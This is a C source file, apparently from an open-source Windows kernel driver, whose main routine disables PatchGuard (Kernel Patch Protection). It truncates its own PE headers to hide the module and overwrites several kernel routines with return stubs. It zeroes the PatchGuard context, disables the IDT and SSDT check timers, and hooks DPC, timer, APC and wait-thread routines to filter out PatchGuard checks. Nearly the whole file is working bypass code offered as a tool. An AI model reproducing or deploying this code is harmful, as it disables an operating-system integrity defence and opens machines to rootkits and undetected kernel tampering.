/*++
* Module Name:
*
*     base.c
*
* Abstract:
*
*     This module contains base routines.
* 
* Author:
* 
*     quokka867 (GitHub/Twitter).
*
--*/

#include "../headers/base.h"

//
// Filter.
//

#define BS_FILTER_CALLBACK_BASE_ID   0x5EA4D8B3UI32
#define BS_FILTER_CALLBACK_ID_OFFSET 0x17A3UI16

// 01.
#define BS_DPC_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
BS_FILTER_CALLBACK_ID_OFFSET)

// 02.
#define BS_TIMER_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
(BS_FILTER_CALLBACK_ID_OFFSET * 2))

// 03.
#define BS_TIMER2_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
(BS_FILTER_CALLBACK_ID_OFFSET * 3))

// 04.
#define BS_APC_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
(BS_FILTER_CALLBACK_ID_OFFSET * 4))

// 05.
#define BS_WORK_ITEM_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
(BS_FILTER_CALLBACK_ID_OFFSET * 5))

// 06.
#define BS_WAIT_THREAD_FILTER_CALLBACK_ID \
(BS_FILTER_CALLBACK_BASE_ID + \
(BS_FILTER_CALLBACK_ID_OFFSET * 6))

#define BS_FILTER_CALLBACK_COUNT 6

//
// Hook.
//

#define BS_HOOK_TARGET_BASE_ID   0xE0943BB3UI32
#define BS_HOOK_TARGET_ID_OFFSET 0xF5E4UI16

// 01.
#define BS_HOOK_TARGET_KICUSTOMRECURSEROUTINEX_ID \
(BS_HOOK_TARGET_BASE_ID + \
BS_HOOK_TARGET_ID_OFFSET)

// 02.
#define BS_HOOK_TARGET_KIEXECUTEALLDPCS_ID \
(BS_HOOK_TARGET_BASE_ID + \
(BS_HOOK_TARGET_ID_OFFSET * 2))

// 03.
#define BS_HOOK_TARGET_KIPROCESSEXPIREDTIMERLIST_ID \
(BS_HOOK_TARGET_BASE_ID + \
(BS_HOOK_TARGET_ID_OFFSET * 3))

// 04.
#define BS_HOOK_TARGET_KIEXPIRETIMER2_ID \
(BS_HOOK_TARGET_BASE_ID + \
(BS_HOOK_TARGET_ID_OFFSET * 4))

// 05.
#define BS_HOOK_TARGET_KIDELIVERAPC_ID \
(BS_HOOK_TARGET_BASE_ID + \
(BS_HOOK_TARGET_ID_OFFSET * 5))

#define BS_HOOK_TARGET_COUNT 5

//
// Epi hook.
//

#define BS_EPI_HOOK_TARGET_BASE_ID   0x0CCCAEF9UI32
#define BS_EPI_HOOK_TARGET_ID_OFFSET 0x5AA6UI16

// 01.
#define BS_HOOK_TARGET_EPI_KEREMOVEPRIQUEUEEPI_ID \
(BS_EPI_HOOK_TARGET_BASE_ID + \
BS_EPI_HOOK_TARGET_ID_OFFSET)

// 02.
#define BS_HOOK_TARGET_EPI_KEWAITFORSINGLEOBJECTEPI_ID \
(BS_EPI_HOOK_TARGET_BASE_ID + \
(BS_EPI_HOOK_TARGET_ID_OFFSET * 2))

// 03.
#define BS_HOOK_TARGET_EPI_KEWAITFORMULTIPLEOBJECTSEPI_ID \
(BS_EPI_HOOK_TARGET_BASE_ID + \
(BS_EPI_HOOK_TARGET_ID_OFFSET * 3))

// 04.
#define BS_HOOK_TARGET_EPI_KEDELAYEXECUTIONTHREADEPI_ID \
(BS_EPI_HOOK_TARGET_BASE_ID + \
(BS_EPI_HOOK_TARGET_ID_OFFSET * 4))

#define BS_EPI_HOOK_TARGET_COUNT 4

#define BS_FIX_ROUTINE_COUNT 6

HR_EXPORT_TABLE*
FASTCALL
BsMain (
    VOID
)
/*++
* Routine Description:
*
*     This routine serves as the main.
*
* Arguments:
*
*     None.
*
* Return Value:
*
*     Pointer to the hunter export table.
*
--*/
{
    HR_CONTEXT_DESCRIPTOR HunterContextDesc = { 0 };

    HR_CONTEXT *pHunterContext = NULL;

    VOID (FASTCALL *pMmFreeIndependentPages) (
        IN VOID *pAllocBase,
        IN UINT64 NoBytes
        ) = NULL;

    BOOLEAN IsHyperProtectedCr0 = FALSE;

    CONST UINT8 RoutineExecuteFix[] = {
        //
        // mov al,al
        //
        0x88, 0xC0,

        //
        // nop qword ptr [0xbee * 0xbee]
        //
        0x48, 0x0F, 0x1F, 0x04, 0x25, 0x44, 0x51, 0x8E, 0x00,

        //
        // ret
        //
        0xC3
    };

    UINT32 Seed = 0;

    UINT32 FilterTypeSelectorId = 0;

    UINT32 BsFilterCallbackId = 0;

    UINT32 FilterTypeId = 0;
    VOID *pFilterCallbackRoutine = 0;

    FILTER_CALLBACK *pFilterCallback = { 0 };
    UINT32 CallbackId = 0;

    WRITE_PRCB_QWORD WritePrcbQword = { 0 };

    VOID *pFixRoutine[BS_FIX_ROUTINE_COUNT] = { 0 };

    UINT8 *pStartPgRecurseRoutine = NULL;
    UINT8 *pCurrentPgRecurseRoutine = NULL;
    UINT8 *pNextPgRecurseRoutine = NULL;

    UINT32 BsHookTargetId = 0;
    VOID *pHookTarget = 0;
    VOID *pHookRoutine = 0;

    UINT32 BsEpiHookTargetId = 0;
    UINT64 *pEpiHookTarget = NULL;
    VOID *pEpiHookRoutine = 0;

    HR_EXPORT_TABLE *pHunterExportTable = NULL;

    UINT64 StackLowLimit = 0;
    UINT64 StackHighLimit = 0;

    VOID *pKeBugCheckEx = NULL;

    BOOLEAN IsAborted = TRUE;

    DbgLog(DBG_SUCCESS_PREFIX
           "Module start...\n");

    if (HR_ERROR(InitHunterContext(&HunterContextDesc))) {
        DbgLog(DBG_ABORTED_PREFIX
               "Initial HunterContext initialization failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    pHunterContext = HunterContextDesc.pHunterContext;

    DbgLog(DBG_SUCCESS_PREFIX
           "Initial HunterContext initialized successfully.\n");
    DbgLog(DBG_SUCCESS_PREFIX
           "Initial HunterContext: 0x%I64X\n",
           pHunterContext);

    if (HR_ERROR(MemIsHyperProtectedCr0Unsafe(
        &IsHyperProtectedCr0,
        pHunterContext))) {
        DbgLog(DBG_ABORTED_PREFIX
               "CR0 hyper-protection check failed.\n");
        DBG_BREAK;
        goto aborted;
    } else if (IsHyperProtectedCr0) {
        DbgLog(DBG_ABORTED_PREFIX
               "CR0 is hyper-protected via VMCB/VMCS bitmask.\n");
        DBG_BREAK;
        goto aborted;
    } 

    DbgLog(DBG_SUCCESS_PREFIX
        "CR0 is not hyper-protected.\n");

    if (HR_ERROR(PeTruncateImageHeaders(
        pHunterContext->NTOS_PROCESS.HR_IMAGE.pImageBase))) {
        DbgLog(DBG_ABORTED_PREFIX
               "Module PE headers truncation failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "Module PE headers truncated successfully.\n");

    if (HR_ERROR(HrInitCriticalTable(pHunterContext))) {
        DbgLog(DBG_ABORTED_PREFIX
               "CriticalTable initialization failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "CriticalTable initialized successfully.\n");
 
    FilterTypeSelectorId = FILTER_TYPE_SELECTOR_BASE_ID;

    for (UINT8 i = 0; i < FILTER_TYPE_SELECTOR_ID_COUNT; i++) {
        FilterTypeSelectorId += FILTER_TYPE_SELECTOR_ID_OFFSET;
        pHunterContext->HR_API.pRtlRandomEx(&Seed);
        if (HR_ERROR(FltMgrInitFilterData(
            FilterTypeSelectorId,
            Seed))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter initialization failed.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter selector ID: 0x%I32X\n",
                   FilterTypeSelectorId);
            DBG_BREAK;
            goto aborted;
        }
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "Filters initialized successfully.\n");

    if (HR_ERROR(FltInitWhiteRoutineTable(
        pHunterContext))) {
        DbgLog(DBG_ABORTED_PREFIX
               "FltWhiteRoutineTable initialization failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "FltWhiteRoutineTable initialized successfully.\n");

    if (!(pFilterCallback =
        pHunterContext->HR_API.pMmAllocateIndependentPagesEx(
            PAGE_SIZE,
            (UINT32)-1,
            NULL,
            0))) {
        DbgLog(DBG_ABORTED_PREFIX
               "Filter callbacks allocation failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "Filter callbacks allocated successfully.\n");

    BsFilterCallbackId = BS_FILTER_CALLBACK_BASE_ID;

    for (UINT8 i = 0; i < BS_FILTER_CALLBACK_COUNT; i++) {
        BsFilterCallbackId += BS_FILTER_CALLBACK_ID_OFFSET;
        switch (BsFilterCallbackId) {
        case BS_DPC_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrDpcFilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardDpc;
            break;
        case BS_TIMER_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrTimerFilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardDpc;
            break;
        case BS_TIMER2_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrTimer2FilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardTimer2;
            break;
        case BS_APC_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrApcFilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardApc;
            break;
        case BS_WORK_ITEM_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrWorkItemFilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardWorkItem;
            break;
        case BS_WAIT_THREAD_FILTER_CALLBACK_ID:
            FilterTypeId = g_FltMgrWaitThreadFilterTypeId;
            pFilterCallbackRoutine = (VOID*)&FltIsPatchGuardWaitThread;
            break;
        default:
            DbgLog(DBG_ABORTED_PREFIX
                   "Unknown filter callback ID.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter callback ID: 0x%I32X\n",
                   BsFilterCallbackId);
            DBG_BREAK;
            goto aborted;
        }
        if (HR_ERROR(FltMgrInitFilterCallback(
            pFilterCallback + i,
            &CallbackId,
            pFilterCallbackRoutine,
            0))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter callback initialization failed.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter callback ID: 0x%I32X\n",
                   BsFilterCallbackId);
            DBG_BREAK;
            goto aborted;
        } else if (HR_ERROR(FltMgrRegisterFilterCallback(    
            FilterTypeId,
            pFilterCallback + i))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter callback registration failed.\n",
                   BsFilterCallbackId);
            DbgLog(DBG_ABORTED_PREFIX
                   "Filter callback ID: 0x%I32X\n",
                   BsFilterCallbackId);
            DBG_BREAK;
            goto aborted;
        }
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "Filter callbacks initialized successfully.\n");

    WritePrcbQword.pHunterContext = 
        pHunterContext;
    WritePrcbQword.Qword = 0;
    WritePrcbQword.IsIpi = TRUE;

    WritePrcbQword.OffsetQword =
        pHunterContext->NTOS_OFFSETS_TABLE.KPRCB_OFFSETS.
        OffsetHalReserved + (8 * 7);
    pHunterContext->HR_API.pKeIpiGenericCall(
        (KIPI_BROADCAST_WORKER*)&NtosWritePrcbQword,
        (UINT64)&WritePrcbQword);

    WritePrcbQword.OffsetQword =
        pHunterContext->NTOS_OFFSETS_TABLE.KPRCB_OFFSETS.
        OffsetAcpiReserved;
    pHunterContext->HR_API.pKeIpiGenericCall(
        (KIPI_BROADCAST_WORKER*)&NtosWritePrcbQword,
        (UINT64)&WritePrcbQword);

    if (WritePrcbQword.IpiSuccessCount !=
        ((pHunterContext->HR_API.pKeQueryActiveProcessorCountEx(
            ALL_PROCESSOR_GROUPS) * 2))) {
        DbgLog(DBG_ABORTED_PREFIX
               "Processing of PRCBs failed.\n");
        DBG_BREAK;
        goto aborted;
    }
    
    DbgLog(DBG_SUCCESS_PREFIX
           "PRCBs processed successfully.\n");

    pFixRoutine[0] = pHunterContext->NTOS_ROUTINES.pCcBcbProfiler;
    pFixRoutine[1] = pHunterContext->NTOS_ROUTINES.pCcBcbProfiler2;
    pFixRoutine[2] = pHunterContext->NTOS_ROUTINES.pKiDispatchCallout;
    pFixRoutine[3] = pHunterContext->NTOS_ROUTINES.pKiSwInterruptDispatch;
    pFixRoutine[4] = pHunterContext->NTOS_ROUTINES.pKiDecodeMcaFault;
    pFixRoutine[5] = pHunterContext->NTOS_ROUTINES.pFsRtlUninitializeSmallMcb;

    for (UINT8 i = 0; i < (sizeof(pFixRoutine) / 8); i++) {
        if (HR_ERROR(MemWriteRomData(
            (UINT8*)pFixRoutine[i],
            RoutineExecuteFix,
            sizeof(RoutineExecuteFix)))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "NTOS routine fix failed.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "NTOS routine: 0x%I64X\n",
                pFixRoutine[i]);
            DBG_BREAK;
            goto aborted;
        }
    }

    pHunterContext->
        NTOS_ITEMS.pKiBalanceSetManagerPeriodicDpc->DeferredRoutine =
        (PKDEFERRED_ROUTINE)pHunterContext->
        NTOS_ROUTINES.pKiBalanceSetManagerDeferredRoutine;
    pHunterContext->
        NTOS_ITEMS.pKiBalanceSetManagerPeriodicDpc->DeferredContext =
        (VOID*)pHunterContext->
        NTOS_ITEMS.pKiBalanceSetManagerPeriodicEvent;

    _InterlockedExchange64(
        (volatile LONG64*)
        pHunterContext->NTOS_ITEMS.pPgGlobalContext,
        0);
    _InterlockedExchange(
        (volatile LONG*)
        pHunterContext->NTOS_ITEMS.pPgCheckTimerIDT,
        MAXUINT32);
    _InterlockedExchange(
        (volatile LONG*)
        pHunterContext->NTOS_ITEMS.pPgCheckTimerSSDT,
        MAXUINT32);

    DbgLog(DBG_SUCCESS_PREFIX
           "NTOS fixes installed successfully.\n");

    pStartPgRecurseRoutine =
        (UINT8*)pHunterContext->NTOS_ROUTINES.pKiCustomRecurseRoutineX;

    pCurrentPgRecurseRoutine =
        pStartPgRecurseRoutine;

    pNextPgRecurseRoutine = (pCurrentPgRecurseRoutine + 13) +
        (INT64)(*(INT32*)(pCurrentPgRecurseRoutine + 9));

    do {
        if (*(pCurrentPgRecurseRoutine + 8) != 0xE8) {
            DBG_BREAK;
            goto aborted;
        }
        if (HR_ERROR(HkInstallRoutineHook(
            (VOID*)pCurrentPgRecurseRoutine,
            FALSE,
            (VOID*)&HkKiCustomRecurseRoutineX,
            pHunterContext))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "Hook installation failed.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "NTOS routine: 0x%I64X\n",
                   pCurrentPgRecurseRoutine);
            DBG_BREAK;
            goto aborted;
        }
        pCurrentPgRecurseRoutine = pNextPgRecurseRoutine;
        pNextPgRecurseRoutine =
            (pNextPgRecurseRoutine + 13) +
            (INT64)(*(INT32*)(pNextPgRecurseRoutine + 9));
    } while (pCurrentPgRecurseRoutine != pStartPgRecurseRoutine);

    BsHookTargetId = BS_HOOK_TARGET_BASE_ID;

    for (UINT8 i = 0; i < BS_HOOK_TARGET_COUNT; i++) {
        BsHookTargetId += BS_HOOK_TARGET_ID_OFFSET;
        switch (BsHookTargetId) {
        case BS_HOOK_TARGET_KICUSTOMRECURSEROUTINEX_ID:
            continue;
        default:
            break;
        }
        switch (BsHookTargetId) {
        case BS_HOOK_TARGET_KIEXECUTEALLDPCS_ID:
            pHookTarget =
                (VOID*)pHunterContext->
                NTOS_ROUTINES.pKiExecuteAllDpcs;
            pHookRoutine = (VOID*)&HkKiExecuteAllDpcs;
            break;
        case BS_HOOK_TARGET_KIPROCESSEXPIREDTIMERLIST_ID:
            pHookTarget =
                (VOID*)pHunterContext->
                NTOS_ROUTINES.pKiProcessExpiredTimerList;
            pHookRoutine = (VOID*)&HkKiProcessExpiredTimerList;
            break;
        case BS_HOOK_TARGET_KIEXPIRETIMER2_ID:
            pHookTarget =
                (VOID*)pHunterContext->
                NTOS_ROUTINES.pKiExpireTimer2;
            pHookRoutine = (VOID*)&HkKiExpireTimer2;
            break;
        case BS_HOOK_TARGET_KIDELIVERAPC_ID:
            pHookTarget =
                (VOID*)pHunterContext->
                NTOS_ROUTINES.pKiDeliverApc;
            pHookRoutine = (VOID*)&HkKiDeliverApc;
            break;
        default:
            DbgLog(DBG_ABORTED_PREFIX
                   "Unknown hook target ID.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "Hook target ID: 0x%I32X\n",
                   BsHookTargetId);
            DBG_BREAK;
            goto aborted;
        }
        if (HR_ERROR(HkInstallRoutineHook(
            (VOID*)pHookTarget,
            FALSE,
            (VOID*)pHookRoutine,
            pHunterContext))) {
            DbgLog(DBG_ABORTED_PREFIX
                   "Hook installation failed.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "NTOS routine: 0x%I64X\n",
                   pHookTarget);
            DBG_BREAK;
            goto aborted;
        }
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "Hooks installed successfully.\n");

    BsEpiHookTargetId = BS_EPI_HOOK_TARGET_BASE_ID;

    for (UINT8 i = 0; i < BS_EPI_HOOK_TARGET_COUNT; i++) {
        BsEpiHookTargetId += BS_EPI_HOOK_TARGET_ID_OFFSET;
        switch (BsEpiHookTargetId) {
        case BS_HOOK_TARGET_EPI_KEREMOVEPRIQUEUEEPI_ID:
            pEpiHookTarget =
                (UINT64*)&pHunterContext->
                NTOS_ROUTINES.pKeRemovePriQueueEpi[0];
            pEpiHookRoutine = (VOID*)&HkKeRemovePriQueueEpi;
            break;
        case BS_HOOK_TARGET_EPI_KEWAITFORSINGLEOBJECTEPI_ID:
            pEpiHookTarget =
                (UINT64*)&pHunterContext->
                NTOS_ROUTINES.pKeWaitForSingleObjectEpi[0];
            pEpiHookRoutine = (VOID*)&HkWaitThreadEpi;
            break;
        case BS_HOOK_TARGET_EPI_KEWAITFORMULTIPLEOBJECTSEPI_ID:
            pEpiHookTarget =
                (UINT64*)&pHunterContext->
                NTOS_ROUTINES.pKeWaitForMultipleObjectsEpi[0];
            pEpiHookRoutine = (VOID*)&HkWaitThreadEpi;
            break;
        case BS_HOOK_TARGET_EPI_KEDELAYEXECUTIONTHREADEPI_ID:
            pEpiHookTarget =
                (UINT64*)&pHunterContext->
                NTOS_ROUTINES.pKeDelayExecutionThreadEpi[0];
            pEpiHookRoutine = (VOID*)&HkWaitThreadEpi;
            break;
        default:
            DbgLog(DBG_ABORTED_PREFIX
                   "Unknown EPI hook target ID.\n");
            DbgLog(DBG_ABORTED_PREFIX
                   "EPI hook target ID: 0x%I32X\n",
                   BsEpiHookTargetId);
            DBG_BREAK;
            goto aborted;
        }
        for (UINT8 i2 = 0; i2 < EPILOGUE_MAXCOUNT; i2++) {
            if (pEpiHookTarget[i2]) {
                if (HR_ERROR(HkInstallRoutineHook(
                    (VOID*)pEpiHookTarget[i2],
                    TRUE,
                    (VOID*)pEpiHookRoutine,
                    pHunterContext))) {
                    DbgLog(DBG_ABORTED_PREFIX
                           "EPI hook installation failed.\n");
                    DbgLog(DBG_ABORTED_PREFIX
                           "NTOS routine: 0x%I64X\n",
                            pEpiHookTarget[i2]);
                    DBG_BREAK;
                    goto aborted;
                }
            }
        }
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "EPI hooks installed successfully.\n");

    if (HR_ERROR(HrInitHunterExportTable(
        pHunterContext,
        &pHunterExportTable))) {
        DbgLog(DBG_ABORTED_PREFIX
               "ExportTable initialization failed.\n");
        DBG_BREAK;
        goto aborted;
    }

    DbgLog(DBG_SUCCESS_PREFIX
           "ExportTable initialized successfully.\n");

    DbgLog(DBG_SUCCESS_PREFIX
           "ExportTable: 0x%I64X\n", pHunterExportTable);

    IsAborted = FALSE;

aborted:

    if (IsAborted) {
        if (pHunterContext) {
            pHunterContext->HR_API.pIoGetStackLimits(
                &StackLowLimit,
                &StackHighLimit);
            pKeBugCheckEx = (VOID*)pHunterContext->HR_API.pKeBugCheckEx;
            pMmFreeIndependentPages =
                pHunterContext->HR_API.pMmFreeIndependentPages;
            RtlSecureZeroMemory(
                HunterContextDesc.pAllocBase,
                (HunterContextDesc.LowPaddingSize +
                sizeof(HR_CONTEXT) +
                HunterContextDesc.HighPaddingSize));
            pMmFreeIndependentPages(
                HunterContextDesc.pAllocBase,
                REQUIRED_NUMBER_OF_PAGES(
                (HunterContextDesc.LowPaddingSize +
                sizeof(HR_CONTEXT) +
                HunterContextDesc.HighPaddingSize))
                << PAGE_SHIFT);
            if (pFilterCallback) {
                RtlSecureZeroMemory(
                    pFilterCallback,
                    PAGE_SIZE);
                pMmFreeIndependentPages(
                    pFilterCallback,
                    PAGE_SIZE);
            }
        } else {
            StackHighLimit = (UINT64)_AddressOfReturnAddress();
        }

        HkCustomBugCheckAsm64(
            BS_INITIALIZATION_ABORTED,
            (VOID*)StackHighLimit,
            pKeBugCheckEx);
    }

    return pHunterExportTable;
}

